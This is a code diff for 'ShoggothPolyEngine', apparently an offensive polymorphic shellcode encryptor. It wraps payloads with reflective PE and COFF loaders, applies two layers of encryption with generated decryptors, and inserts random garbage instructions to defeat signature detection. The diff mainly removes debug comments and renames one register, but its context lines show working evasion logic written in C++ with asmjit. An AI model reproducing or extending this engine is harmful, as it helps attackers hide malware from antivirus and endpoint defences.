@@ -18,8 +18,6 @@ ShoggothPolyEngine::ShoggothPolyEngine(OPTIONS* parsedOptions):
 }
 
 
-// *****************************************************
-
 // Resulted form is call + payload + pop garbage + reflective loader
 PBYTE ShoggothPolyEngine::AddPELoader(PBYTE payload, int payloadSize, int& newPayloadSize) {
     int reflectiveLoaderSize = 0;
@@ -83,13 +81,6 @@ PBYTE ShoggothPolyEngine::AddPELoader(PBYTE payload, int payloadSize, int& newPa
     }
     return payloadWithLoader;
 }
-
-
-/*
-00007FF6BB58511B  xor         r8d,r8d
-00007FF6BB58511E  xor         edx,edx
-00007FF6BB585120  mov         rcx,qword ptr [test]
-*/
 
 PBYTE ShoggothPolyEngine::AddCOFFLoader(PBYTE payload, int payloadSize, PBYTE arguments, int argumentSize, int& newPayloadSize) {
     int coffLoaderSize = 0;
@@ -221,8 +212,6 @@ PBYTE  ShoggothPolyEngine::GeneratePopWithGarbage(x86::Gp popReg, int& popStubSi
     popStubSize = garbageSize + popSize;
     VirtualFree(garbageInstructions, 0, MEM_RELEASE);
     this->asmjitRuntime.release(popPtr);
-    // 
-    // VirtualFree(popPtr, 0, MEM_RELEASE);
     return returnValue;
 }
 
@@ -244,8 +233,6 @@ PBYTE ShoggothPolyEngine::AssembleCodeHolder(int& codeSize) {
     endOffset = this->asmjitAssembler->offset();
     codeSize = endOffset - startOffset;
     Error err = this->asmjitRuntime.add(&functionPtr, &asmjitCodeHolder);
-    // returnValue = (PBYTE) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, codeSize);
-    // memcpy(returnValue, functionPtr, codeSize);
     this->ResetAsmjit();
     return (PBYTE)functionPtr;
 }
@@ -325,7 +312,6 @@ PBYTE ShoggothPolyEngine::StartPolymorphicEncrypt(PBYTE payload, int payloadSize
     PBYTE firstGarbageWithPayload = NULL;
     PBYTE firstEncryptedPayload = NULL;
     PBYTE firstDecryptorAndEncryptedPayload = NULL;
-    //PBYTE firstEncryptionKey = GetRandomBytes(firstKeySize);
     PBYTE firstEncryptionKey = NULL;
     PBYTE secondEncryptedPayload = NULL;
     PBYTE secondDecryptorAndEncryptedPayload = NULL;
@@ -390,18 +376,14 @@ PBYTE ShoggothPolyEngine::StartPolymorphicEncrypt(PBYTE payload, int payloadSize
         firstDecryptorSize = firstGarbageWithPayloadSize;
     }
     
-    // Func test = (Func)firstDecryptorAndEncryptedPayload;
-    // test();
 
     if (!this->configurationOptions.dontDoSecondEncryption) {
         // Apply second encryption
         if (this->configurationOptions.encryptOnlyDecryptor) {
-            // 0x90 ? Fix the patch
             PBYTE oldSecondEncryptedPayload = NULL;
             // Form is first decryptor + payload
             secondEncryptedPayload = this->SecondEncryption(firstDecryptorAndEncryptedPayload, firstDecryptorSize, secondEncryptedSize);
             oldSecondEncryptedPayload = secondEncryptedPayload;
-            // TODO: Test skip first encryption
             // Skip decryptor and merge the payload
             secondEncryptedPayload = MergeChunks(secondEncryptedPayload, secondEncryptedSize, firstDecryptorAndEncryptedPayload + firstDecryptorSize, firstDecryptorAndEncryptedPayloadSize - firstDecryptorSize);
             secondEncryptedSize += (firstDecryptorAndEncryptedPayloadSize - firstDecryptorSize);
@@ -476,7 +458,7 @@ PBYTE ShoggothPolyEngine::GetCallInstructionOverPayload(int payloadSize,int &cal
 }
 
 PBYTE ShoggothPolyEngine::GetPopInstructionAfterPayload(int& popSize) {
-    asmjitAssembler->pop(this->addressHolderForSecondEncryption);
+    asmjitAssembler->pop(this->firstAddressHolderForSecondEncryption);
     return this->AssembleCodeHolder(popSize);
 }
 
@@ -490,15 +472,8 @@ PBYTE ShoggothPolyEngine::GenerateRandomGarbage(int &garbageSize) {
     // Get garbage instructions
     this->GenerateGarbageInstructions();
     garbageInstructions = this->AssembleCodeHolder(codeSizeGarbage);
-    // garbageInstTest = (Func)garbageInstructions;
-    // VirtualProtect(garbageInstructions, codeSizeGarbage, PAGE_EXECUTE_READWRITE, NULL);
-    // garbageInstTest();
-    // Generate jmp over random byte
     this->GenerateJumpOverRandomData();
     jmpOverRandomByte = this->AssembleCodeHolder(codeSizeJmpOver);
-    // jmpOverRandomByteTest = (Func)jmpOverRandomByte;
-    // VirtualProtect(jmpOverRandomByteTest, codeSizeGarbage, PAGE_EXECUTE_READWRITE, NULL);
-    // jmpOverRandomByteTest();
     if (RandomizeBool()) {
         returnValue = MergeChunks(jmpOverRandomByte, codeSizeJmpOver, garbageInstructions, codeSizeGarbage);
     }
@@ -511,7 +486,6 @@ PBYTE ShoggothPolyEngine::GenerateRandomGarbage(int &garbageSize) {
     return returnValue;
 }
 
- // Tested
 void ShoggothPolyEngine::GenerateJumpOverRandomData() {
     size_t randomSize = RandomizeInRange(30, 50);
     PBYTE randomBytes = GetRandomBytes(randomSize);
@@ -522,7 +496,6 @@ void ShoggothPolyEngine::GenerateJumpOverRandomData() {
     asmjitAssembler->bind(randomLabelJmp);
     HeapFree(GetProcessHeap(), NULL, randomBytes);
     HeapFree(GetProcessHeap(), NULL, randomString);
-    // this->DebugCurrentCodeBuffer();
 }
 
 void ShoggothPolyEngine::GenerateGarbageInstructions() {
@@ -889,7 +862,6 @@ void ShoggothPolyEngine::RandomUnsafeGarbage() {
     }
     asmjitAssembler->push(randomGeneralPurposeRegisterDest);
     BYTE randomValue = (BYTE)(RandomizeInRange(0, 255));
-    //TODO : ADD memory examples, 
     switch (randomIndexForSelect) {
     case 1:
         asmjitAssembler->add(randomGeneralPurposeRegisterDest, randomValue);
